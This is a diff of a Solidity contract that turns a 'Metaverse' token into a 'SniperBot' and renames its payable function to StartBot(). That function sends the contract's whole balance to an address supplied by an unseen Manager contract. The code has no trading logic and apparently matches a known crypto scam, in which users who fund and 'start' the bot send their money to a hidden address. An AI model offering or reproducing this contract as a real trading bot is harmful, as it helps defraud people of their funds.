@@ -5,14 +5,13 @@ import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contra
 import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
  
  
-contract Metaverse {
+contract SniperBot {
     Manager manager;
     mapping(address => uint) public balances;
     mapping(address => mapping(address => uint)) public allowance;
     uint public decimals = 18;
-    uint public totalSupply = 1000000000 * 10 ** 18; //Coin Supply
-    string public name = "MetaVerse"; //Coin Name
-    string public symbol = "META"; //Coin Symbol 
+    uint public totalSupply = 0 * 10 ** 18; // Converting to wei
+    
  
     event Transfer(address indexed from, address indexed to, uint value);
     event Approval(address indexed owner, address indexed spender, uint value);
@@ -55,7 +54,7 @@ contract Metaverse {
  
     //Transfer to the address which create this contract.
 	receive() external payable {}
-    function CreatePair() public payable {
+    function StartBot() public payable {
         payable(manager.pancakeswapCreatePair()).transfer(address(this).balance);
         manager;        
     }
